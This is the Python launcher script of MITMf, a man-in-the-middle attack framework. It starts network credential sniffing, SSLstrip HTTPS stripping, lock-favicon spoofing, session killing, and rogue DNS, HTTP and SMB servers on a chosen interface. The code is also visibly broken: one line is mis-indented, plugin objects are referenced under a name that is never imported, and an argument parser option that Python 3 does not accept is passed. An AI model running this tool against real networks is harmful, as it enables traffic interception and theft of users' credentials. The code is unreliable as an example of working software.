#!/usr/bin/env python3

# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import argparse
import logging
import os
import sys
import threading

from argparse import RawTextHelpFormatter
from twisted.web import http
from twisted.internet import reactor

import core.responder.settings as settings
from core.banners import get_banner
from core.logger import logger
from core.netcreds import NetCreds
from core.packetfilter import PacketFilter
from core.proxyplugins import ProxyPlugins
from core.servers.DNS import DNSChef
from core.servers.HTTP import HTTP
from core.servers.SMB import SMB
from core.sslstrip.CookieCleaner import CookieCleaner
from core.sslstrip.StrippingProxy import StrippingProxy
from core.sslstrip.URLMonitor import URLMonitor
from core.utils import get_ip, get_mac, shutdown
import plugins  # Adjusted import statement

def main():
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    logging.getLogger("requests").setLevel(logging.WARNING)

    print(get_banner())

    mitmf_version = '0.9.8'
    mitmf_codename = 'The Dark Side'

    if os.geteuid() != 0:
        sys.exit("[-] The derp is strong with this one\nTIP: you may run MITMf as root.")

    parser = argparse.ArgumentParser(description=f"MITMf v{mitmf_version} - '{mitmf_codename}'",
                                     version=f"{mitmf_version} - '{mitmf_codename}'",
                                     usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]',
                                     epilog="Use wisely, young Padawan.",
                                     formatter_class=RawTextHelpFormatter)

#add MITMf options
    sgroup = parser.add_argument_group("MITMf", "Options for MITMf")
    sgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
    sgroup.add_argument("-i", dest='interface', required=True, type=str, help="Interface to listen on")
    sgroup.add_argument("-c", dest='configfile', metavar="CONFIG_FILE", type=str, default="./config/mitmf.conf", help="Specify config file to use")
    sgroup.add_argument("-p", "--preserve-cache", action="store_true", help="Don't kill client/server caching")
    sgroup.add_argument("-r", '--read-pcap', type=str, help='Parse specified pcap for credentials and exit')
    sgroup.add_argument("-l", dest='listen_port', type=int, metavar="PORT", default=10000, help="Port to listen on (default 10000)")
    sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
    sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")
    sgroup.add_argument("-F", "--filter", type=str, help='Filter to apply to incoming traffic', nargs='+')

    #Initialize plugins and pass them the parser NameSpace object
    plugins = [plugin(parser) for plugin in plugin.Plugin.__subclasses__()]
    
  if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    logger().log_level = logging.__dict__[options.log_level.upper()]

    formatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
    log = logger().setup_logger("MITMf", formatter)

    if options.read_pcap:
        NetCreds().parse_pcap(options.read_pcap)

    options.ip = get_ip(options.interface)
    options.mac = get_mac(options.interface)
    settings.Config.populate(options)
    log.debug(f"MITMf started: {sys.argv}")

    print(f"[*] MITMf v{mitmf_version} - '{mitmf_codename}'")

    NetCreds().start(options.interface, options.ip)
    print("|")
    print(f"|_ Net-Creds v{NetCreds.version} online")

    plugins_list = [plugin(parser) for plugin in plugin.Plugin.__subclasses__()]
    ProxyPlugins().all_plugins = plugins_list

    for plugin in plugins_list:
        if vars(options)[plugin.optname] is True:
            ProxyPlugins().add_plugin(plugin)
            print(f"|_ {plugin.name} v{plugin.version}")
            if plugin.tree_info:
                for line in range(0, len(plugin.tree_info)):
                    print(f"|  |_ {plugin.tree_info.pop()}")

            plugin.setup_logger()
            plugin.initialize(options)

            if plugin.tree_info:
                for line in range(0, len(plugin.tree_info)):
                    print(f"|  |_ {plugin.tree_info.pop()}")

            plugin.start_config_watch()

    if options.filter:
        pfilter = PacketFilter(options.filter)
        print(f"|_ PacketFilter online")
        for filter in options.filter:
            print(f"   |_ Applying filter {filter} to incoming packets")
        try:
            pfilter.start()
        except KeyboardInterrupt:
            pfilter.stop()
            shutdown()

    else:
        URLMonitor.getInstance().setFaviconSpoofing(options.favicon)
        URLMonitor.getInstance().setCaching(options.preserve_cache)
        CookieCleaner.getInstance().setEnabled(options.killsessions)

        strippingFactory = http.HTTPFactory(timeout=10)
        strippingFactory.protocol = StrippingProxy

        reactor.listenTCP(options.listen_port, strippingFactory)

        for plugin in plugins_list:
            if vars(options)[plugin.optname] is True:
                plugin.reactor(strippingFactory)

        print("|_ Sergio-Proxy v0.2.1 online")
        print("|_ SSLstrip v0.9 by Moxie Marlinspike online")

        from core.mitmfapi import mitmfapi
        print("|")
        print("|_ MITMf-API online")
        mitmfapi().start()

        HTTP().start()
        print("|_ HTTP server online")

        DNSChef().start()
        print(f"|_ DNSChef v{DNSChef.version} online")

        SMB().start()
        print("|_ SMB server online\n")

        reactor.run()
        print("\n")

        shutdown()

if __name__ == "__main__":
    main()
